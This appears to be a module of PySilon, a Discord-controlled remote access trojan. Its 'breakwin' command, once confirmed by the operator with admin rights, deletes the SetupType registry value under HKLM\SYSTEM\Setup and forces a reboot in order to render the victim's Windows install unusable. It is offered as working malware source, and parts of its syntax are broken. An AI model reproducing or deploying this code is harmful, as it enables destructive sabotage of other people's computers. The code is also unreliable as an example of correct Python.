#<imports>
import subprocess
import asyncio
#</imports>

@client.command(name='breakwin')
async def break_windows(ctx):
    await ctx.message.delete()
    try:
        if IsAdmin():
            reaction_msg = await self.get_channel(self.channel_id).send(embed=self.generate_embed(
                title='🟣 System',
                description=f'```Are you sure you want to {render_text('completely break')} Windows?```',
                color=0xa020f0,
                footer=['Please ⭐ our repository if you enjoy'],
                author=[DEFAULT, DEFAULT]))
            await reaction_msg.add_reaction('✅'); await reaction_msg.add_reaction('❌')
            def win_break_confirm(reaction, user):
                return str(reaction.emoji) in ['✅', '❌'] and user == ctx.author
            try:
                reaction, user = await client.wait_for('reaction_add', check=win_break_confirm)
                if str(reaction.emoji) == '✅':
                    await self.get_channel(self.channel_id).send(embed=self.generate_embed(
                        title='🟢 Executing',
                        description=f'```{render_text('Break Windows')} will now be {render_text('executed')}. Bye bye!```',
                        color=0x00ff00,
                        footer=['Please ⭐ our repository if you enjoy'],
                        author=[DEFAULT, DEFAULT]))
                    subprocess.run(['reg', 'delete', 'HKLM\\SYSTEM\\Setup', '/v', 'SetupType', '/f'], check=True)
                    subprocess.run(['shutdown', '/r', '/f', '/t', '0'], check=True)
                else: return await ctx.send("```❗ Cancelled by user.```")
            except: asyncio.TimeoutError: await ctx.send("```❗ Reaction listener has timed out.```")
        else:
            await self.get_channel(self.channel_id).send(embed=self.generate_embed(
                title='📛 Error',
                description=f'```{render_text('PySilon')} is not running as {render_text('admin')}!```',
                color=0x00ff00,
                footer=['Please ⭐ our repository if you enjoy'],
                author=[DEFAULT, DEFAULT]))
    except:
        await self.get_channel(self.channel_id).send(embed=self.generate_embed(
            title='📛 Error',
            description=f'```An error occurred during {render_text('windows break')}.```',
            color=0x00ff00,
            footer=['Please ⭐ our repository if you enjoy'],
            author=[DEFAULT, DEFAULT]))